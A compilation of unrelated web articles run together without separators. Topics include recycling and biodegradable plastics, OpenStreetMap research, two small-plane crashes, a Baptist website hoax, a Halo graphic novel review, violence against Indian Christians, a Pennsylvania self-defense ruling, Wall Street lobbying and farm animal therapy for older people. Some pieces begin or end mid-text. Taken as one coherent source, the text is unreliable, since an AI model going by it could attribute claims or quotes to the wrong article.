Recycling-industry experts have concerns about Enso's biodegradable efforts, saying they are not convinced the technology works, but they also worry that if it does, it will damage their business.
Dennis Sabourin of the National Association for PET Container Resources said the association is not in favor of anything that disrupts that recycled-product stream.
"We want to make sure it does not affect the raw material," Sabourin said. "Does it affect the service life of products that are being made today with (PET bottles)?"
More than a year ago, the association sent out a news release to all PET manufacturers asking them to refrain from using biodegradable additives. The experts say biodegradable products are more difficult and costly to recycle than PET bottles.
David Cornell of the Association of Postconsumer Plastic Recyclers said Enso has tried to convince them that the biodegradable additive will not hurt their business, but the recycling industry still fears it poses a threat.
"So far, we haven't seen that it does degrade or is not hostile to recycling. If it doesn't degrade, then who wants it? If it does degrade, what does it do to recycling?"
Cornell credits Enso for trying to solve a problem and said that, unlike some other companies, Enso has tried to work with the industry and communicate about product tests.
"They're working on it. I will give them credit," Cornell said.

The first book about the OpenStreetMap (OSM) project was written by Frederik Ramm and Jochen Topf, two well-known OSM enthusiasts, in 2008. The first version was in German which was later translated into an improved English version. It contains similar information as can be found in the book by Jonathan Bennett, which was published in 2010, detailing how the projects' geodata is collected, which editors can be used, some explanations about tags, key and values and how the rendering stack works. Both books are great resources to learn about the OSM basics and to get an overview about useful software.
However, besides these more technical books, the research community has been very active in recent years and has published several articles about OSM data quality, conflation attempts with other datasets or about the contributors of the project. Each of us (Dennis Zielstra and I) wrote a dissertation with different aspects about crowd-sourced geodata and the OSM project: Dennis' work is about OSM data quality in comparison to proprietary and governmental data with emphasis on pedestrian shortest path routing and data imports. Pascal's work tackled the issue of how user-generated geodata can be utilized for disabled people friendly route planning. Both dissertations contain more than 13 publications in total.
Now the important part for you: Both dissertations are now freely available. You can download Dennis' work here and Pascal's thesis here: Combined more than “480” pages about the OpenStreetMap project!
What can you expect from our dissertations? Our work had to be more science oriented (after all they had to fulfill the strict guidelines our universities gave us to get the PhD). This means it contains a bunch of information that can be useful to other researchers; for example, methods to analyze geodata quality or an introduction on parameters that are important for disabled people in a road network. However, we always tried to make the results and findings always as understandable to the general public as possible. We always felt that VGI research about an open source project such as OSM should not only generate results that are so convoluted that only a hand-full of researchers worldwide would understand the concepts in the end. Any OSM contributor should have a benefit from the findings that are published in those dissertations and we hope we accomplished this goal. We also wished we could have published each publication in open source journals to make the results freely available to everyone but this is a whole new topic for a different blog post. Anyway, by providing the dissertations for free we basically accomplished this task now too.
And what can you not you expect from our work? We do not describe how your object of interest should be tagged or how you should run a mapping event. We feel there are already enough sources out there that tackle these issues.
Anyway, we bet that you will find some information in the dissertations about the OSM project which you have not heard about yet, such as the evolution of the German or the United States OSM street network, analyses about data imports or several research projects about contributor behavior, vandalism detection and a quite comprehensive overview about recent developments and future trends in VGI research in general.
Let us know what you think and enjoy the information overload 🙂

EMBED >More News Videos HFD says the plane crashed just before 1:15pm into a vehicle parked outside an Ace Hardware store in southeast Houston.
Three members of an Oklahoma family were killed this afternoon in a small plane crash near Hobby Airport.A National Transportation Safety Board spokesman says the plane crashed at 1:12pm into a vehicle parked outside an Ace Hardware store in the 6800 block of Telephone. No one was inside the parked car, but all three people aboard the plane died immediately.Police in Moore, Oklahoma have identified the victims as Tony, Dana and Jerry Gray. Dana and Tony were married; Jerry was Tony's brother. They were flying from Norman, OK to Houston to visit the brothers' father who is a patient at MD Anderson Cancer Center, according to a family friend. Dana Gray was the pilot."Dana was a very safe pilot. She loved flying. She's been flying that plane for a very long time," said Jeremy Lewis, a family friend and also a sergeant for the Moore Police Department. "Pretty much anyone in Moore know who the Grays are. They're very involved with the community. They're just the best people and it's just unbelievable three of them are gone."The NTSB said the Cirrus SR-20 plane, a fixed wing single-engine aircraft, was en route to Hobby Airport. Gray was trying to land but the plane was too high, so the air traffic controller told them to go around the towers and try again. The air traffic controller also warned about wake turbulence from a nearby 737. During a second attempt, the spokesman said the plane nose-dived into the ground.Audio released by air traffic control revealed the final moments before the crash: "Ma'am, ma'am, straighten up! Straighten up!""I saw the plane. It was going everywhere, all over the place," Navisa Artani said.That model plane is equipped with a parachute. NTSB investigator Tom Latson said the rocket motor deployed but the parachute never did and it's unclear whether the deployment was before or during the crash. There was no mayday call.In the seconds before the plane crashed, eyewitnesses say they heard something that could prove critically important to investigators."You ever listen to those guys playing with toy airplanes? How the spit and sputter. That's what he sound like," said eyewitness Don Howard.That sound was corroborated by others nearby.As the plane crashed outside the Gateway Ace Hardware, Ann Maryland was at work inside."It was like a transformer had blowed, it was real, real loud and it shook the building," she said.Houston Fire department Capt. Ruy Lozano says there was no HazMat spill or fire as a result of the crash.The NTSB plans to return to the crash site Friday to continue the investigation. The aircraft manufacturer and engine manufacturer will join federal investigators.Dana and Tony Gray had four children and owned a roofing business. Some family members traveled to Houston Thursday evening to speak to investigators.
According to an article on Black-tailed Rattlesnakes, this venomous snake packs a punch and “is capable of delivering large amounts of potent venom. If encountered, it should be left alone. A large percentage of envenomations occur when a snake is handled or abused.”
While on a birding trip to Cave Creek Canyon in Arizona last week, our group was treated to more than birds! We saw many lizards and a few snakes also. This beautiful Black-tailed Rattlesnake was sitting on the road and I was able to get photos and video from 4 feet away–directly above him while sitting safely in the seat of the van with the camera out the window! Matt Brown, our guide, snuck around the van and got down eye-level with the snake and snapped a few pictures just out of striking distance. The patterns on this beauty remind me of the patterns that you see in Native American tapestries and pottery. Maybe they were borrowed from this rattler.
Astronomy is a great field and a great hobby. It is peaceful, interesting, and lovely hobby. The night sky gives us thousands of objects to observe. There is the Moon, there are planets up in the sky, there are stars, and then there are galaxies, nebulas and star clusters. In order to see the amazing objects, we need a Telescope. They are visible and in dark skies they are easily visible. One has to learn the constellations.
I got interested in Astronomy back in 2007 and started to find astronomy related people on internet and finally found Amastropak yahoo group. In an event by Amastropak I met some Astronomy enthusiasts and some of them own telescope. Those telescopes were imported from either US or other countries. When we asked them if telescopes are available in Pakistan, they used to say us there isn't any telescope available. In Sep 2008, I founded first ever university level Astronomy club of Karachi or perhaps of Pakistan. It was called SZABIST Astronomy Society. In late 2008, I co-founded Karachi Astronomers Society along with some other Astronomy enthusiasts with the aim of spreading Astronomy in Karachi and Pakistan.
We used to wonder how will we ever buy a telescope while we are in Pakistan. There were two ways, either someone is selling a telescope or you ask some of your relative to bring it in luggage from the USA. Those were like dark ages for us. 🙂 But we were lucky to have Amateur Astronomers around us with their awesome telescopes including largest SCT Meade 16 inch, Obsession 18 inch and the largest telescope of Pakistan 24 inch Webster.
A dream came true
If you want to buy these telescopes, you can email me at me@abubakershekhani.com or drop a comment on this article. I will get you to the right person. You can follow my work in Astronomy and other fields here.
Until 2012, there was no telescope shop that sells good quality telescopes on affordable price. There were few online companies that sell highly priced telescopes. In 2013, Zain Ahmed, one of the founders of Karachi Astronomers Society, founded “Sahal Telescopes and Binoculars” which sells Sky Watcher telescopes. He told me a long time before first shipment and I wasn't sure if that will be possible due to the issues that one face with duties on import and transporting telescopes is a difficult task. But it happened and there were amazing 6″ Sky Watcher f/8 dobsonian telescopes for sale along with accessories. Till now MashaAllah, these telescopes have fulfilled the need of an Amateur astronomer all over Pakistan. Last month, I bought one 6″ Sky Watcher from Sahal Telescopes after testing many specimens bought by other fellow astronomers. 🙂 If you are planning to buy one, don't forget to mention my name and this article to Zain.

Ontario corruption charges hit close to home for Justin Trudeau
Today, prominent Liberal organizer and fundraiser Gerry Lougheed was charged by the OPP for his role in the Sudbury bribery scandal.
"I wish I could say I'm surprised by the news that Mr. Trudeau's bagman has been charged in the election bribery scandal, but, it's just another example of a culture of Liberal and Conservative entitlement and cronyism that has gone on for far too long,” said Charlie Angus, NDP candidate (Timmins – James Bay). “Canadians are fed up, they're tired of Liberal corruption being replaced by Conservative corruption – they're ready for change.”
More than just with Kathleen Wynne, Mr. Lougheed has deep connections to Justin Trudeau.
Here are a few examples:
He supported Justin Trudeau in his leadership bid:

He raised $115,000 in a single night for Mr. Trudeau at a swank $1,300-a-plate Sudbury dinner.
http://www.thestar.com/news/queenspark/2015/02/20/kathleen-wynne-gambled-a-lot-of-political-capital-to-win-byelection.html
He personally donated to Mr. Trudeau`s leadership bid and tried to recruit Glenn Thibeault to run for Mr. Trudeau:
“For the last three years, every time I bumped into him, I'd say, 'Geez Glenn, we got to get you to walk across that floor and join the (Justin) Trudeau team,'

Lockpicking has become a trademark skill of hackers all across the world, and is regularly taught at hackerspaces and maker faires. But a lot of the time, the sets have already been made or bought online somewhere. However, [Sean] has demonstrated how to create a lock picking set with ordinary paperclips in the video embedded at the end of this post. Wikihow also has these awesome instructions on how to build them.
What's great is that the material for these picks are easily found. There are other ways to fashion a set together. For example, street sweeper bristles can be used. And electrical metal tape is a good material as well, but these paperclip sets are, by far, the most accessible. Pretty much anywhere that has office stationary supplies will have mounds of these little metal clips lying around.
But how well do they work? Have you made a paperclip lock picking set before?
If so, let us know in the comments, and tell us how well they did.
[Thanks Bob for the tip!]
Officials with the Southern Baptist Convention said they have been the victim of an elaborate online hoax that included a phony news release announcing that the nation's largest Protestant denomination had changed its position on homosexuality.
The release was sent to an unknown number of reporters and directed readers to a website designed to replicate the real Southern Baptist Convention website, along with working telephone numbers where individuals identified themselves as employees of the SBC Executive Committee.
“It is definitely a hoax,” said Roger Oldham, vice president for communication and convention relations for the SBC Executive Committee. “It seems to be perpetrated by an unidentified hacker who is trying to mimic the look of our SBC.net family of web pages.”
The news release came from a group calling itself the “Southern Baptist Conference of America.” The release falsely announced that the Southern Baptists had met in “extraordinary emergency session” to affirm gay rights and repent “of any past homophobia that not only hurt gay people but kept them ostracized from the church.”
The release included phony quotes and comments affirming homosexuality from real denominational leaders, including Southern Baptist Convention President Bryant Wright.
Wright told Fox News Radio he suspects the cyberattack came as a result of opposition to the denomination's stance on homosexuality and same-sex marriage.
“I have a hunch that maybe somebody that was unhappy with our ongoing stand for sexual purity decided to set up this false website,” Wright said.
The press release also included a working telephone number and directed people to contact Jane Marie Walker for information.
“Other staff members called the number and it redirected them to the Executive Committee of the Southern Baptist Convention but as far as we could tell it did not redirect them to our phones,” Oldham said.
A message on the site informs callers, “You've reached the headquarters of the Southern Baptist Convention.”
On two different occasions, individuals who identified themselves as “interns” declined to answer questions and referred reporters to Walker.
A woman who identified herself as Lisa Jamison said she was a staff member of the denomination.
“This is the Southern Baptist Convention,” she said.
Another person who identified himself as “Clarence,” said: “We have a press release that went out this morning that's talking about this welcoming and affirming stance that the Executive Committee is announcing for next year.”
However, the Southern Baptist Convention said neither individual is an employee of the denomination.
Calls to the fake telephone number have now been directed to voice mail.
Oldham said they are looking into the legal implications of the hoax – but right now they are trying to find out who is responsible for the incident and why someone would go to so much trouble to deceive the public.
“It is a concern whenever anybody does anything that is false and gives a false impression to the public about who we are,” he said.

YouTube accident pilot: ‘I was going to abort' YouTube accident pilot: ‘I was going to abort'
Idaho pilot Les Gropp had six weeks to second-guess his decisions before the world got into the act.
Gropp, at the controls of a 1947 Stinson that crashed following a takeoff at high altitude on a hot day, has been seen by a million people, in video of his ill-fated flight that was posted Aug. 4 by one of the passengers—all of whom walked away with scratches. Gropp, a commercial pilot who is 70 and logged about 1,200 hours flying UH-1 “Huey” helicopters in the Vietnam War, suffered a broken jaw and ribs. He expects to make a full recovery, and return to the cockpit with a lesson learned.
‘Not the best decision'
The Stinson struggled down the 5,000-foot unpaved runway at Bruce Meadows in Idaho, and Gropp said he was about to abort the effort when “a gust of wind put me in the air.” The Stinson managed to climb just above treetop height but was not gaining altitude, though Gropp said he had expected it would, once airborne. It eventually became clear the Stinson was not going to climb. “After that, it was finding a place to land.”
Soon after passing the last of the clear area, the airplane began to sink, and the wings clipped treetops sending the four-seater tumbling to the ground.
Gropp said he managed to slow to about 40 mph just before impact, and the Stinson came to rest upside-down amid the trees, cameras still filming as the dazed pilot and passengers got themselves out of the wreckage.
“My estimation of the density altitude was about 2,000 feet off,” Gropp said, noting that he had taken instruction in mountain flying and logged about 300 hours in general aviation aircraft, including the Stinson he purchased in 2010, in the past four years. Many of those flights were to backcountry destinations.
Gropp said the decision to attempt the takeoff despite climbing temperatures that pushed the density altitude well above the airport elevation of 6,370 feet “was not the best decision of my life,” and he should have ferried his passengers to their next destination—about 45 minutes away, with 6,108 feet of paved runway—one at a time.
The vintage POH did not make performance calculations easy, Gropp said, and he thinks they can be improved to provide critical information in a clearer format.
Critics have not been shy about taking Gropp to task for various decisions, including an attempted liftoff at altitude with a fully enriched mixture, and failure to abort the takeoff once the ground roll stretched to excessive length. Gropp was reluctant to discuss the particulars in detail, but said he was aware of the criticism leveled by online viewers. He did not offer an opinion on the public reaction.
“Everything's been said with the movie,” Gropp said.
Unexpected fame
Pilot Les Gropp, captured by video cameras as he attempted an ill-fated takeoff in Idaho June 30, said he is thankful that everybody walked away. Image by Nathan Williams, used with permission.
Nathan Williams, the right front seat passenger, captured images of the crash with a small HD camera mounted inside the cockpit. Williams, a longtime family friend (Gropp was his scoutmaster when Williams was a Boy Scout), said the flight into Bruce Meadows had been smooth and uneventful, his first in a general aviation aircraft.
“We weren't expecting anything quite like this,” Williams said of the accident. The same is true of the mass interest in the footage he posted more than a month after the accident. The video was intended for family and friends, people who had heard the story for a month but never seen it from inside the cockpit. As YouTube viewers began clicking, Williams said he was tempted to take the video down—“I didn't want it to hurt Les”—but opted to leave the original up and running when he saw that others on the site “had basically stolen it and made it their own.”
Williams; Gropp; Gropp's son, Tol Gropp; and Alec Arhets have achieved a celebrity none of them expected, called on for network television interviews to recount their harrowing ordeal. It is unusual, if not unprecedented, for a GA accident to be captured by in-cockpit video, and seen by hundreds of thousands, a distinction Gropp said he did not seek--posting the video was a decision made entirely by the passengers who own the footage, Gropp said. Gropp said the video's popularity is most likely attributable to two factors: the novelty of having a cockpit view of a crash, and the fact no one was killed.
“It's kind of become something that we didn't intend or expect at all,” Williams said.
Williams said that he is grateful nobody was killed, or more seriously injured, and he hopes Gropp's mistake becomes a lesson that helps others avoid a similar fate—or worse.
“Les is a guy that I really respect,” Williams said.

If you're like me Halo was one of the first games that brought you together with a group a friends to have a LAN party. For those who don't know, or are too young, a LAN party was when a group of friends would get together with multiple systems to play multiplayer while being wired into a central server, router, or another device that allowed consoles to speak to each other. Those were great days, and it's how most fans of the HALO series began their love affair with the franchise. Today, the franchise has expanded outside of our gaming consoles and into novels and graphic novels.
HALO: Fall of Reach, is a series of adaptations of the Novel HALO: The Fall of Reach. It's a great place for newer readers to jump into by providing a good introduction into the main story elements of the HALO universe. The graphic novel contains three story arcs. The first of the three story arcs is “Boot Camp.” It tells the story of John-117's young life and his Spartan training. The second arc is “Covenant” which tells the beginnings of the Human-Covenant war. And lastly, “Invasion” which tells the story of the initial invasion of Reach, Operation Enduring Winter, and finally the fall of Reach itself.
In “Boot Camp”, we see the story of the childhood of SPARTAN-ll commander John-177. We learn of his entry into the supersoldier program in the beginning of the 26th century. I use the word entry loosely. Reason being, John had no real choice in becoming part of the program. We get a glimpse of the early trauma and training endured by John-177, and, we get to see how he became the SPARTAN we know today in the HALO universe. Writer Brian Reed really gives us a graphic look into the program and has us questioning the moral reasons for the program's existence. He also touches on another major theme with the value of free will versus the need for security. Felix Ruiz also worked very well to bring to life a complex and powerful set of stories collected in this graphic novel.
More from Bounding Into Comics
The middle arc, “Covenant” follows right after “Boot Camp”. This arc touches on one of the biggest questions we ourselves ask when we look to the sky, “Are we alone?” In the Halo universe they got that answer, and sometimes being alone isn't a bad thing, because not all aliens come in peace. The United Nations Space Command learns this lesson the tough way. Master Chief and his Spartans have to find out what the Covenant are searching for before it's too late. The pace of this section is torrid as the Spartans race against time to answer critical questions, that in the end, can mean the difference between life and death for the entire human race.
The final story arc is ”Invasion”. Here we first learn of a mission that if successful could put an end to the bloody war between the Covenant and Earth. This arc also follows the battle, and eventual fall of Reach itself. Reed did an excellent job translating what was a full novel into a graphic novel here, and Feliz in turn took his talents to help build a world for the reader to witness first hand. The story of Master Chief first meeting Cortana sets us up for the importance of both characters to the HALO universe. Finally with “Invasion”, the reader begins to discover that there is more to what is going on than even some of the leaders might know, with hints peppered by Brian Reed all throughout the entire novel. This final arc is a fantastic ending to this book, and becomes a great launching pad for the first HALO game.
The Verdict
HALO: Fall of Reach is an excellent source of background information for the HALO universe. It also provides an excellent origin for it's the most important hero. The art y Feliz Ruiz is excellent. He really brings the story alive and allows you to immerse yourself. I believe that Brian Reed did a great job at that for the reader. I strongly recommend this one whether you are looking for an introduction or just want to fill in some holes.

The U.S. economy is the largest economy in the world.
However, it wasn't always the largest.
And it's unlikely to remain the largest economy for much longer.
The chart above comes to us via Deutsche Bank's Jim Reid.
“As Alexander, Rome and Britain fell from their positions of absolute global dominance, so too has the US begun to slip,” Reid writes. “America's global economic dominance has been declining since 1998, well before the Global Financial Crisis.
“A large part of this decline has actually had little to do with the actions of the US but rather with the unravelling of a century's long economic anomaly. China has begun to return to the position in the global economy it occupied for millenia before the industrial revolution.”
One look at the chart, and it's pretty clear that it may not be very long before we start saying the U.S. is number 2.
“Based on current trends China's economy will overtake America's in purchasing power terms within the next few years,” Reid continued. “The US is now no longer the world's sole economic superpower and indeed its share of world output (on a PPP basis) has slipped below the 20% level which we have seen was a useful sign historically of a single dominant economic superpower.
“In economic terms we already live in a bi- polar world. Between them the US and China today control over a third of world output (on a PPP basis).”
Reid offered this prescient quote from Napoleon Bonaparte: “”Let China sleep, for when she awakes, she will shake the world.”

MUMBAI, India – Four separate incidents of violence and intimidation around Christmas time illustrates that India's powerful militant Hindu national movements continue to make life increasingly difficult for the country's Christian minority.
Six people were injured on Thursday when a youthful mob belonging to an extremist Hindu nationalist group attacked a Christian church, claiming that the church was forcibly converting Hindus to Christianity.
According to a report in the Times of India, roughly 60 people were in the mob that set upon the Full Gospel Church, located in Gorakhpur in Uttar Pradesh state.
“The attackers were waving saffron flags and were armed with sticks,” said AB Lal, the church's pastor. “They barged into the church and kept chanting ‘Jai Shri Ram',” adding that the church was vandalized in the incident, which he said went on for roughly an hour.
Saffron is the color associated with India's Hindu nationalist movements, and “Jai Shri Ram”, meaning “Hail Lord Ram!”, is a common battle cry.
According to witnesses, the attackers shattered the church's window panes and even uprooted Christmas trees, roughing up several congregants in the process.
“We are so scared that we have to now cancel all the programs in church,” Lal said, saying that local police have put the attack down to “unknown persons.”
In another anti-Christian incident earlier this month in western India on December 14, Christians were beaten while caroling.
Father Stephen Rawat, parish priest of Saints Peter and Paul Church in Banswara Rajasthan in Udaipur diocese, told Crux that to date no arrests have been made in that incident either.
“Whenever we make enquiries, police merely say that they are still searching,” he said.
It's a frequent complaint of Christians and other minorities that police forces, especially in rural areas, are often reluctant to investigate crimes linked to Hindu nationalist groups, since they are often the effective political power in the area and some police members may even have ties to the groups.
Another incident took place in the same area of Western India over Christmas, where Sajan K. George, President of the Global Council of Indian Christians, told Crux that eight Pentecostals were beaten and injured by a group of armed men who attacked their Christmas service.
Banswara Superintendent of Police Anand Sharma said on Monday that a formal complaint was lodged against eight persons over the attack. Of the accused, he said only one has been detained, while the others absconded.
Sharma said the clash broke out when a group of Hindus some 200 yards away from the church objected to Christians playing hymns and Christmas songs over a loudspeaker, and went on a rampage.
Elsewhere in the state's Alwar district on the same day, around 10 bike-borne militants allegedly threatened a Christian pastor, accusing him of carrying out religious conversions, local media reported.
George strongly insisted that Indian Christians have done nothing to provoke the violence.
“Christians are not doing anything illegal,” he said, “and religious Freedom is a Constitutional guarantee.”
For some time, the roughly 30 million Christians in India, about half of whom are Catholic, have suffered various forms of intimidation and harassment, including physical violence. One human rights observatory estimates there's an average of one physical assault on a Christian somewhere in India every other day.
In the main, the violence is driven by Hindu nationalists who accuse Christians of the use of force and surreptitious tactics in pursuing conversions, often storming into villages and leading “reconversion” ceremonies in which Christians are compelled to perform Hindu rituals.
The charge of untoward proselytizing techniques is strongly rejected by Christians officials, including the leadership of the country's Catholic church.
So holds last week's decision in Madziva v. Philadelphia Housing Auth. (Pa. Commw. Ct. May 12, 2014), just posted on Westlaw Friday:
Appellant [Simbarashe Madziva] worked for PHA as an asset property manager from January 2009 until his last day of work on December 5, 2011. According to the complaint, in August 2011, a PHA resident entered a PHA office and loudly demanded a housing transfer. Appellant was in the back office when the resident arrived, but after hearing her loud demands, he entered the front office. Appellant attempted to calm down the resident and assist her with a transfer.
Unsatisfied with Appellant's response, the resident grabbed Appellant and dug her nails into his waist. The resident's young son also began hitting Appellant. Appellant responded by breaking the resident's grip and freeing himself from her grasp. The resident then left the office returning shortly with PHA police officers.
The police officers interviewed those present, and they asked Appellant if he wished to press charges, which he declined to do because his injuries were minor. The police investigation concluded Appellant did not commit any wrongdoing.
Five weeks after the incident, PHA suspended Appellant without pay for 10 days and recommended termination for fighting in violation of PHA's human resource manual. The manual strictly prohibits any form of fighting including in self-defense and provides for termination for a violation.
Appellant requested a hearing to challenge his termination. In November 2011, PHA held a short hearing at which Appellant and his supervisor, who was not present for the incident, testified. Appellant testified he acted non-violently to free himself from his attacker. He also requested a copy of the PHA police investigation report, which PHA denied.
In December 2011, the PHA hearing officer issued a decision upholding the termination of Appellant's employment. The hearing officer concluded fighting was an infraction warranting termination and the PHA human resource manual provides whether the employee was the aggressor or acting in self-defense makes no difference in the determination.
Because the PHA police investigation report stated there was punching and shoving between Appellant and the resident, the hearing officer concluded the suspension and termination must be upheld. PHA then issued a final notice of termination from employment….
A. Rights to Self–Defense, Substantive Due Process
1. Contentions
Appellant asserts the right of self-defense and the right of substantive due process, which is necessary here to protect his self-defense interest, are constitutionally protected liberty interests. He claims these rights emanate from Article 1, Section 1 of the Pennsylvania Constitution, which provides:
All men are born equally free and independent, and have certain inherent and indefeasible rights, among which are those of enjoying and defending life and liberty, of acquiring, possessing and protecting property and reputation, and of pursuing their own happiness.
Also, Appellant relies on language in Commonwealth v. Brown, 8 Pa. Super. 339 (1898), especially the following quotation (referencing the right to acquire, possess and protect property, including the right to make reasonable contracts):
The word ‘liberty' as used in these constitutional declarations means more than freedom of locomotion. It includes and comprehends among other things freedom of speech, the right of self defense against unlawful violence, the right to live and work where he will, to earn his livelihood in any lawful calling, to pursue any lawful trade or avocation, and to freely buy and sell as others may….
We agree with Appellant that he enjoyed a constitutional liberty interest in defending himself from unlawful violence, regardless of whether he had a property interest in his at-will employment. Moreover, this liberty interest is reflected in a public policy permitting use of force in self-defense in various circumstances, both criminal and civil. According to these authorities, the liberty interest in self-defense against unlawful violence has limitations.
We also agree that the liberty interest of self-defense against unlawful violence is broader than, and not dependent on, a right to bear arms…. Considering the foregoing, Appellant satisfied the necessary foundation for pleading a cause of action …. To the extent that the respected trial court decided otherwise, it fell into error. Accordingly, we must reverse and remand….
Wall Street Destroying Weak Regulation by Purchasing the House of Representatives
Wall Street heavily donates to House Speaker John Boehner in an effort to destroy even the weakest regulations.
By: William Shaub, Online Editor
No serious person concerned with banking regulation was pleased with the end result of the House Democrats' 2010 legislative response to 2008's financial crisis.
Critics like Matt Taibbi weren't even remotely satisfied, describing the Dodd-Frank Wall Street Reform and Consumer Protection Act as a “cop-out, a Band-Aid on a severed artery…” representing “the end of the best opportunity we had to do something real about the criminal hijacking of America's financial-services industry.”
The corporate legion on Wall Street, however, severely disagrees with Taibbi and the assertions of other critics. Wall Street is quite concerned about the reforms that Dodd-Frank introduced, and it's proving its point by shifting resources from supporting the old majority faction of the United States' one party system to the new one: the House Republican caucus.
Specifically, New York hedge fund, Paulson & Co., has contributed $61,050 to House Speaker John Boehner's campaign since January. Moore Capital Management LLP “employees” proffered $53,000, and Cantor Fitzgerald LP donated $45,000. According to the business press (Bloomberg News,) not a single one of these firms contributed to Boehner's 2010 election bid. Why donate to the most powerful member of the House now?
[pullquote]
The answer: break up the big banks…and nationalize them to a local level by giving stakeholders (employees)…a role to play when major decision-making must take place.
[/pullquote]
January happened to be the month that the GOP controlled House voted along party lines to cut the budget of the Commodity Futures Trading Commission, a bureau writing most of the new derivative-trading rules. The House Appropriations Committee, led by Rep. Paul Ryan, voted to limit funding for the new consumer protection bureau. The consumer protection bureau is also absent a leader, courtesy of Republican opposition to Elizabeth Warren and now Richard Cordray.
In fact, financial firms are so concerned about Warren, that they've picked up on rumors that she might run against Sen. Scott Brown in Massachusetts. Their response to the rumors wasn't slight; the Huffington Post's Amanda Terkel pointed out that they donated 16% of Brown's total campaign contributions for the second quarter of 2011, which amounts to about $320,000 in funds.
The author of what Taibbi perhaps correctly deemed a “cop out”, Rep. Barney Frank (D-MA), told the liberal press that the opposition party's refusal to fund the financial regulators who are supposed to implement Dodd-Frank is effectively destroying the legislation. “They can't do the new duties. They can't even carry out some of the old ones,” he insisted.
Wall Street's extensive lobbying against Dodd-Frank is strikingly unprecedented. Former labor secretary Robert Reich writes that “the six largest banks spent $29.4 million on lobbying last year, according to firm disclosures — record spending for the group.” The Center for Public Integrity has reported that “the Street and other financial institutions engaged about 3,000 lobbyists to fight Dodd-Frank – more than five lobbyists for every member of Congress – and have hired almost the same number to delay, weaken, or otherwise prevent its implementation.”
Is “taking the money” out of politics the way to limit Wall Street's control of the government? Our problems run deeper than that, although it would certainly help. Campaign funding totals are a remarkable indicator of elections and policy, evidenced by the intense lobbying that turned Dodd-Frank from what the Wall Street Journal originally called “sweeping regulation” into a “cop out.”
The real answer remains clear: break up the big banks through democratizing policies and nationalize them to a local level by giving stakeholders (employees) and communities a role to play when major decision-making must take place.
In essence, the market power of economic giants must be reduced. Without dismantling the concentrated authority that allows them to undermine democratic functions, their political and financial power will continue to subordinate John Boehner, the Republican caucus, and the rest of the U.S government. For all that Dodd-Frank and its reforms weren't, they were something. We've gotten to the point where anything is too much, yet the economic stakes are atmospherically high, and future stability for main street is in the balance.

How animals at Stepney City Farm are helping older people to look after their mental health
How animals at Stepney City Farm are helping older people to look after their mental health
Loneliness has become an epidemic.
While we're told we're more connected than ever – we've got phones, the internet, social media – so many of us still feel desperately alone.
And while this is having a hugely negative affect on millennials, it's even more of an issue for the older generation.
A company is paying for two people to travel the world... But they need to be strangers
Left in care homes, separated from their partners, and losing friends, a massive portion of the elderly can go ages without any form of real human connection. They feel isolated, depressed, and utterly alone.
There's no easy solution. But there are ways we can help.
Furry Tales is one program stepping up to offer older people and those with mental health issues some much-needed support.

As part of Stepney City Farm, Furry Tales is a program that provides older adults with animal-assisted therapy.

Members of the group come down to the farm once a week and spend time with rabbits, ferrets, goats, and donkeys.
It's more than just stroking a bunny's ears to relax, to be clear (as soothing as that is in itself).
The sessions are guided by Merlin Strangeway and Jane Plimmer, along with other volunteers, who help to encourage conversation, teach participants about animal care and nature, and make sure everyone's comfortable.

The project was originally set up by Ione Rojas, who worked at Stepney City Farm up until March 2016. She was inspired by her own love of animals to bring their therapeutic effects to the lives of older people, who may be isolated and house-bound with limited access to the outside world.
At first the animals were taken into the care homes.
Now, Furry Tales holds a weekly club where older people can visit to get out of the house, spend some time with animals, and have a chat with new friends.
(Picture: Ellen Scott/metro.co.uk)
‘We work mainly with older adults (over the age of 60) who experience loneliness and social isolation, including those who have a diagnosis of dementia and/or other mental and physical health conditions,' Jane tells metro.co.uk.

‘Animals provide non-judgmental, unconditional companionship; stir memories and stimulate conversations.
‘They also offer physical and emotional comfort and sensory contact for people who may otherwise have scarce physical contact with others.
‘Additionally, by enabling older people to form and maintain their social connections with animals, nature, the farm and each other, Furry Tales endeavours to promote independence, improve mood and help to alleviate isolation.'
And it works.
(Picture: Ellen Scott/metro.co.uk)
We visited the farm and met Jean, who's been attending the sessions for months.
After moving into a home, Jean's been unable to adopt a cat (following years of being a cat owner), so comes to Furry Tales every week to get some time stroking animals.
Along with the rabbits, who Jean adores, there are also cats roaming around the farm – so Jean is able to embrace her inner cat lady, even if it's only once a week.
(Picture: Ellen Scott/metro.co.uk)
Merlin tells us stories of another member of the Furry Tales club, who was terrified of animals before she started coming to the sessions. Now she's a fan of the ferrets, happily letting them rest in her arms and climb in pockets.
We watch as people who struggled to introduce themselves open up when a basket, filled with a peaceful rabbit, is placed on their lap. We watch scared, anxious faces turn into surprise, happiness, and comfort as they stroke a bunny's ears or peer in at the goats.

It's amazing what a difference a little time with animals can make – and how easily an animal's twitching nose can open up the conversation and make people feel less alone.
The sessions are varied, and it's open to the participants to control the pace.
(Picture: Ellen Scott/metro.co.uk)
They can involve observation of rabbits, guinea pigs, ferrets, and chickens, animal handling, grooming, and stroking, making toys for the animals, learning about nature, doing quizzes, playing bunny bingo (in which participants watch the rabbits and tick off behaviours), creating artwork, growing vegetables and plants, doing mini-tours of the farm to check in with the donkeys, goats, sheep, and pigs, and having refreshments while everyone has a laidback chat.
The animals are carefully selected from the farm for their comforting presence, so there's no risk of a grumpy goat nipping at an elderly man just trying to stroke its nose.
‘We have 15 rabbits, seven guinea pigs, two ferrets and numerous chickens on the farm,' Jane tells us.
(Picture: Ellen Scott/metro.co.uk)
‘All the animals have different personalities and we tend to select those who are more confident, sociable and outgoing, and those who are happy to be picked up, stroked, fed and groomed.
‘Additionally, we spend time socialising the animals and learning about their likes and dislikes.'
To find the human participants, Furry Tales has an outreach programme, which runs between six to eight weeks in length and takes place inside residential homes, hospital wards, and housing projects.

Once the programme's all finished, the residents are invited along to the drop-in Furry Tales club at the farm every Friday.

Furry Tales also takes referrals from GPs, day care centres, nursing homes, and local authorities, who recommend anyone they feel could benefit from animal-assisted therapy.
People are also able to self-refer. Everyone who could benefit is welcome, basically.
And as all the people helping to facilitate the sessions is a volunteer, they benefit, too, getting the joy of socialising with the older generation along with the simple pleasure of wandering around a farm and spotting animals.

Some of the volunteers at Stepney City Farm are ex-service personnel, ex-offenders adults with special education needs, victims of trauma, and corporate volunteers looking to gain confidence, learn news skills, and spend time with people. Furry Tales gives these volunteers a safe space to do that, whether they're tasked with helping with the sessions or building a wheelchair accessible ferret enclosure.
It's all wonderful, in ways that go far beyond the cuteness of a donkey gently munching on grass.*
*Although that is really bloody cute.
